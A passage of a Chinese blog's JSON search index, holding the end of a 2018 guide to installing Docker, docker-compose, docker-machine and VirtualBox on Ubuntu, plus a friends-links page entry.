7，安装docker 如果想指定安装某一版本，可使用 sudo apt-get install docker-ce= 命令，把替换为具体版本即可。 以下命令没有指定版本，默认就会安装最新版 $ sudo apt-get install docker-ce 8，查看docker版本 $ docker -v 显示“Docker version 17.09.0-ce, build afdb6d4”字样，表示安装成功。 二、docker-compose安装 1，下载docker-compose $ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 2，授权 $ sudo chmod +x /usr/local/bin/docker-compose 3，查看版本信息 $ docker-compose --version 显示出版本信息，即安装成功。 三、docker-machine安装 说明：docker-machine的使用是要基于virtualBox的。如果没有安装安装过，请先安装virtualBox。 1，安装virtualBox 登录virtualBox官网：https://www.virtualbox.org/wiki/Linux_Downloads 找到\"Ubuntu 16.04 (“Xenial”) i386 | AMD64\"字样，点击“AMD64”进行下载。 下载后，执行以下命令进行安装： $ sudo dpkg -i virtualbox-5.2_5.2.0-118431_Ubuntu_xenial_amd64.deb 2，下载并安装docker-machine $ curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` \u003e/tmp/docker-machine \u0026\u0026 chmod +x /tmp/docker-machine \u0026\u0026 sudo cp /tmp/docker-machine /usr/local/bin/docker-machine 3，查看版本信息 $ docker-machine version 显示出版本信息，即安装成功。 ","date":"2018-03-09","objectID":"/docker%E7%9A%84%E5%AE%89%E8%A3%85/:0:0","tags":["docker"],"title":"docker安装","uri":"/docker%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"记录一些兴趣相投的朋友们","date":"0001-01-01","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":" 添加您的 FixIt 网站 您可以通过 创建 PR 或 编辑数据 按 nickname 以字典顺序将您的 FixIt 网站添加到此页面，格式如下： - nickname: \u003cyour nickname\u003e avatar: \u003cyour avatar\u003e url: \u003cyour site link\u003e description: \u003cdescription of your site\u003e  网站失效、停止维护、不当内容都可能被取消链接！ ","date":"0001-01-01","objectID":"/friends/:0:0","tags":null,"title":"友情链接","uri":"/friends/"}]